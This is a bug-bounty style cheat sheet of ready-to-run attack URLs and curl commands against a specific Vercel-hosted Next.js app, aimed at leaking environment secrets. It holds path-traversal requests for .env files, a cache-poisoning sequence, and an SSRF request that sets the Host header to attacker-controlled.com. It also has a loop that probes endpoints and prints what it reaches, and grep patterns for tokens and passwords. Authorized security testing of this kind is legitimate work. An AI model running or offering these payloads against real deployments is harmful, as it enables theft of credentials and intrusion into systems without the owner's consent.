# Quick Test URLs - Critical Targets

Copy and paste these URLs directly into your browser or curl commands.

## CRITICAL - Test First (Most Likely to Leak Env Vars)

### 1. Vercel Special Paths (Source & Logs)
```
https://nextjs-cve-hackerone.vercel.app/_src
https://nextjs-cve-hackerone.vercel.app/_logs
```

If accessible, these will contain:
- **/_src**: Full source code including .env files
- **/_logs**: Build logs that may print environment variables

### 2. Source Maps (Hardcoded Secrets)
```
https://nextjs-cve-hackerone.vercel.app/_next/static/chunks/main.js.map
https://nextjs-cve-hackerone.vercel.app/_next/static/chunks/webpack.js.map
https://nextjs-cve-hackerone.vercel.app/_next/static/chunks/framework.js.map
https://nextjs-cve-hackerone.vercel.app/_next/static/chunks/pages/_app.js.map
```

First check if source maps are referenced:
```
curl https://nextjs-cve-hackerone.vercel.app/_next/static/chunks/main.js | grep sourceMappingURL
```

### 3. Environment Variable API Routes
```
https://nextjs-cve-hackerone.vercel.app/api/env
https://nextjs-cve-hackerone.vercel.app/api/config
https://nextjs-cve-hackerone.vercel.app/api/debug
https://nextjs-cve-hackerone.vercel.app/api/health
https://nextjs-cve-hackerone.vercel.app/api/status
```

## HIGH PRIORITY

### 4. CVE-2025-55183 (Source Code Exposure)
```bash
curl -H "Accept: text/x-component" \
     -H "Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D" \
     https://nextjs-cve-hackerone.vercel.app/
```

Look for RSC payload that might expose server-side code.

### 5. Build Manifests (Route & Config Info)
```
https://nextjs-cve-hackerone.vercel.app/_next/static/bIW_p-jXOXL69_fsJ2_vY/_buildManifest.js
https://nextjs-cve-hackerone.vercel.app/_next/static/bIW_p-jXOXL69_fsJ2_vY/_middlewareManifest.js
https://nextjs-cve-hackerone.vercel.app/_next/static/bIW_p-jXOXL69_fsJ2_vY/_app-build-manifest.json
```

### 6. Configuration Files (Path Traversal)
```
https://nextjs-cve-hackerone.vercel.app/_next/../../.env
https://nextjs-cve-hackerone.vercel.app/_next/../../.env.local
https://nextjs-cve-hackerone.vercel.app/_next/../../.env.production
https://nextjs-cve-hackerone.vercel.app/_next/../next.config.js
https://nextjs-cve-hackerone.vercel.app/_next/../package.json
https://nextjs-cve-hackerone.vercel.app/_next/../vercel.json
```

## MEDIUM PRIORITY

### 7. Cache Poisoning Test (CVE-2025-49005)
```bash
# Step 1: Poison the cache
curl -H "Accept: text/x-component" \
     -H "RSC: 1" \
     -H "Next-Router-Prefetch: 1" \
     https://nextjs-cve-hackerone.vercel.app/

# Step 2: Check if poisoned (normal request)
curl https://nextjs-cve-hackerone.vercel.app/
```

If successful, second request will return RSC payload (JSON) instead of HTML.

### 8. Additional API Routes
```
https://nextjs-cve-hackerone.vercel.app/api/graphql
https://nextjs-cve-hackerone.vercel.app/api/trpc
https://nextjs-cve-hackerone.vercel.app/api/webhook
https://nextjs-cve-hackerone.vercel.app/api/metadata
```

### 9. Debug & Development Endpoints
```
https://nextjs-cve-hackerone.vercel.app/_next/static/development/_devPagesManifest.json
https://nextjs-cve-hackerone.vercel.app/_next/webpack-hmr
https://nextjs-cve-hackerone.vercel.app/__nextjs_original-stack-frame
```

### 10. Discovery Files
```
https://nextjs-cve-hackerone.vercel.app/robots.txt
https://nextjs-cve-hackerone.vercel.app/sitemap.xml
```

## ADVANCED TESTS

### Test Response Headers for Information Leakage
```bash
curl -I https://nextjs-cve-hackerone.vercel.app/ | grep -i "x-vercel\|x-next"
```

Look for:
- x-vercel-id (deployment ID)
- x-vercel-cache (cache status)
- x-vercel-execution-region (region)
- x-nextjs-page (route info)

### SSRF Test (CVE-2024-34351)
```bash
curl -X POST https://nextjs-cve-hackerone.vercel.app/ \
  -H "Host: attacker-controlled.com" \
  -H "Next-Action: 007138e0bfbdd7fe024391a1251fd5861f0b5145dc" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" \
  --data-binary $'------WebKitFormBoundary\r\nContent-Disposition: form-data; name="0"\r\n\r\n[]\r\n------WebKitFormBoundary--\r\n'
```

### GraphQL Introspection (if GraphQL endpoint exists)
```bash
curl -X POST https://nextjs-cve-hackerone.vercel.app/api/graphql \
  -H "Content-Type: application/json" \
  --data '{"query":"{ __schema { types { name } } }"}'
```

## ONE-LINER QUICK SCAN

Test all critical endpoints in one command:

```bash
for url in \
  "/_src" \
  "/_logs" \
  "/_next/static/chunks/main.js.map" \
  "/api/env" \
  "/api/config" \
  "/_next/../../.env" \
  "/_next/static/bIW_p-jXOXL69_fsJ2_vY/_buildManifest.js"; \
do \
  echo "[*] Testing: $url"; \
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://nextjs-cve-hackerone.vercel.app$url"); \
  echo "    Status: $STATUS"; \
  if [ "$STATUS" = "200" ]; then \
    echo "    [!!!] ACCESSIBLE!"; \
    curl -s "https://nextjs-cve-hackerone.vercel.app$url" | head -20; \
  fi; \
done
```

## WHAT TO LOOK FOR

When testing these URLs, search responses for:

1. **VERCEL_PLATFORM_PROTECTION** (target variable)
2. Other VERCEL_* environment variables
3. API keys, tokens, secrets
4. Database credentials
5. Internal endpoints/URLs
6. Stack traces with file paths
7. Source code comments
8. Build output/logs

## GREP FOR SECRETS

If you find accessible content, grep for secrets:

```bash
curl https://nextjs-cve-hackerone.vercel.app/ENDPOINT | \
  grep -Ei "VERCEL_|api[_-]?key|secret|password|token|env\.|process\.env"
```

## AUTOMATED TESTING

Run the comprehensive Python script:

```bash
chmod +x test_alternative_vectors.py
./test_alternative_vectors.py
```

This will test all vectors automatically and save results to files.
